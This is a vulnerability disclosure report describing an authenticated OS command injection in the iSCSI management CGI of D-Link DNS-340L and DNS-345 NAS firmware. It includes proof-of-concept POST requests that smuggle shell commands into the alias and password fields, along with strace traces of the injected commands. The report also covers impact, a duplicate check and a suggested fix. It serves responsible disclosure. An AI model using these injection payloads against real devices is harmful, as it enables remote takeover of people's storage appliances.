# Vulnerability Submission: D-Link DNS-340L / DNS-345 iscsi_mgr.cgi OS Command Injection

## Basic Information

| Field | Value |
|-------|-------|
| VulnDB ID | Pending assignment |
| CVE ID | Pending assignment |
| CWE ID | CWE-78 |
| CVSS v3.1 Score | 8.8 |
| CVSS v3.1 Vector | AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H |
| Vulnerability Type | OS Command Injection |
| Internal ID | DLINK-CMD-006 |

## Affected Product

| Field | Value |
|-------|-------|
| Vendor | D-Link |
| Product | DNS-340L ShareCenter; DNS-345 ShareCenter |
| Confirmed Firmware Versions | DNS-340L REVA 1.01B04; DNS-345 REVA 1.03B06, 1.04.B02, 1.05b04 HOTFIX |
| Affected Binary | cgi/iscsi_mgr.cgi |
| Web Endpoint | /cgi-bin/iscsi_mgr.cgi |
| Architecture | ARM EABI5 little-endian |
| Confirmed Binary SHA1 | DNS-340L 1.01B04: fd166f0915a7fd5a6a75a50f2348636a9b7df251; DNS-345 1.03B06 / 1.04.B02 / 1.05b04 HOTFIX: 8a1f1762b019bc708dae850337512678f48902cf |

## Description

The `iscsi_mgr.cgi` CGI handler implements iSCSI target management. Multiple authenticated iSCSI management branches concatenate HTTP POST parameters into shell command strings passed to `iscsictl`, including:

```text
iscsictl --chk_target -n <alias> >/dev/null
iscsictl --add_target_lun -n <alias> -V '<volume_location>' -s <size> -p 1 -c <security> -U <username> -P <password> >/dev/null
iscsictl --add_target_lun -n <alias> -F '<img_file>' -c <security> -U <username> -P <password> >/dev/null
iscsictl --set_auth -n <alias> -c 1 -U <username> -P <password> >/dev/null
iscsictl --del_target_lun -n <alias> -R >/dev/null
iscsictl --target_state -e 1 -n <alias> >/dev/null
```

Because `alias`, `username`, `password`, and image-file path values are not shell-metacharacter neutralized before being placed into these command lines, an authenticated web attacker can inject shell metacharacters and execute arbitrary commands as the CGI process user.

The vulnerable paths are reachable from the authenticated iSCSI management UI. `iscsi.js` sends POST requests to `/cgi-bin/iscsi_mgr.cgi` for `cmd=cgi_add_iscsi`, `cmd=cgi_modify_iscsi`, `cmd=cgi_del_iscsi`, `cmd=cgi_enable_iscsi`, and `cmd=cgi_disable_iscsi`.

## Impact

Successful exploitation allows authenticated remote command execution on the NAS appliance. The attacker can run arbitrary shell commands, alter iSCSI target configuration, access stored data, or disrupt storage services.

This report is limited to parameter-to-`iscsictl` command-injection paths confirmed with marker files and qemu strace. The iSNS server IP branch was also tested, but it did not produce marker files or unescaped controlled command lines and is not claimed here.

## Proof of Concept

Low-impact marker examples:

```http
POST /cgi-bin/iscsi_mgr.cgi HTTP/1.1
Host: <TARGET>
Content-Type: application/x-www-form-urlencoded

cmd=cgi_add_iscsi&alias=target;touch /tmp/DLINK_CMD_006_alias.hit;#&volume_location=HD_a2&size=1&security=0&username=user&password=FirmRecPassword12&img_file=
```

```http
POST /cgi-bin/iscsi_mgr.cgi HTTP/1.1
Host: <TARGET>
Content-Type: application/x-www-form-urlencoded

cmd=cgi_modify_iscsi&alias=target&security=1&username=user&password=FirmRecPassword12;touch /tmp/DLINK_CMD_006_pwd.hit;#&size=2
```

## Runtime Evidence

Focused verification artifacts:

- `scripts/oneoff/verify_iscsi_mgr_branch_params_20260526.py`
- `inout/reports/0day_verification_20260526/iscsi_mgr_branch_params_runtime_20260526.json`
- `inout/reports/0day_verification_20260526/iscsi_mgr_branch_params_triage_20260526.md`
- `inout/reports/0day_verification_20260526/iscsi_mgr_duplicate_check_20260526.json`
- `inout/reports/0day_verification_20260526/iscsi_mgr_duplicate_check_20260526.md`

Runtime summary:

| Firmware | Binary SHA1 | Marker hits | Controlled shell traces |
|----------|-------------|-------------|-------------------------|
| DNS-340L 1.01B04 | fd166f0915a7fd5a6a75a50f2348636a9b7df251 | 10 | 10 |
| DNS-345 1.03B06 | 8a1f1762b019bc708dae850337512678f48902cf | 10 | 10 |
| DNS-345 1.04.B02 | 8a1f1762b019bc708dae850337512678f48902cf | 10 | 10 |
| DNS-345 1.05b04 HOTFIX | 8a1f1762b019bc708dae850337512678f48902cf | 10 | 10 |

Representative qemu strace evidence:

DNS-340L 1.01B04 `cgi_add_iscsi` alias:

```text
execve("/bin/sh",{"sh","-c","iscsictl --chk_target -n target;touch /tmp/FIRMREC_DNS340L_101B04_ISCSI_MGR_20260526_add_alias.hit;# >/dev/null",NULL})
```

DNS-345 1.03B06 `cgi_modify_iscsi` password:

```text
execve("/bin/sh",{"sh","-c","iscsictl --set_auth -n target -c 1 -U user -P FirmRecPassword12;touch /tmp/FIRMREC_DNS345_103B06_ISCSI_MGR_20260526_mod_pwd.hit;# >/dev/null",NULL})
```

The verifier created marker files in the temporary qemu sysroots for add, modify, delete, enable, and disable iSCSI branches across all four tested firmware images.

## Public Duplicate Check

Public duplicate checks on 2026-05-26 did not find a directly matching public CVE or disclosure for D-Link `iscsi_mgr.cgi` command injection through `cgi_add_iscsi`, `cgi_modify_iscsi`, or `iscsictl` management parameters.

NVD API checks:

| Query | Result |
|-------|--------|
| `iscsi_mgr.cgi` | 0 CVE records |
| `D-Link iscsi_mgr.cgi command injection` | 0 CVE records |
| `cgi_add_iscsi` | 0 CVE records |
| `cgi_modify_iscsi` | 0 CVE records |
| `iscsictl D-Link` | 0 CVE records |
| `D-Link iscsictl` | 0 CVE records |
| `DNS-340L iscsi_mgr.cgi` | 0 CVE records |
| `DNS-345 iscsi_mgr.cgi` | 0 CVE records |

Manual web search terms also checked:

```text
"iscsi_mgr.cgi" "D-Link"
"cgi_add_iscsi" "D-Link"
"iscsictl --add_target_lun" "D-Link"
"D-Link" "iscsi_mgr.cgi" "command injection"
"D-Link" "iscsictl" vulnerability
"cgi_modify_iscsi"
"iscsictl --set_auth" "D-Link"
```

Broader D-Link NAS command-injection searches return known same-family prior art for other endpoints. Those records are relevant prior art but are not direct duplicates of the verified `iscsi_mgr.cgi` / `iscsictl` command paths.

No search pass can prove global non-existence of private, vendor-only, paywalled, or poorly indexed reports. Repeat the duplicate check immediately before external filing.

## Discovery

| Field | Value |
|-------|-------|
| Discovery Method | FirmRec cross-firmware vulnerability mining plus branch-aware runtime verification |
| Date Verified | 2026-05-26 |
| Verification | Direct CGI POST probes in restored D-Link DNS rootfs images under qemu-arm-static with command markers |

## Suggested Fix

1. Replace shell-based command construction with argument-vector APIs such as `execve()` that do not invoke `/bin/sh`.
2. Treat iSCSI target names, CHAP usernames/passwords, and image paths as structured values, not shell fragments.
3. Enforce strict server-side allowlists for target aliases, CHAP fields, sizes, and image-file paths.
4. Reject shell metacharacters, command substitutions, quoting characters, separators, and malformed path values before iSCSI management actions.
5. Add server-side authorization and CSRF protections for iSCSI management actions.

## Disclosure Timeline

| Date | Event |
|------|-------|
| 2026-05-26 | Vulnerability verified with runtime marker evidence |
| TBD | Reported to D-Link PSIRT |
| TBD | CVE ID assigned |
| TBD | Public disclosure |
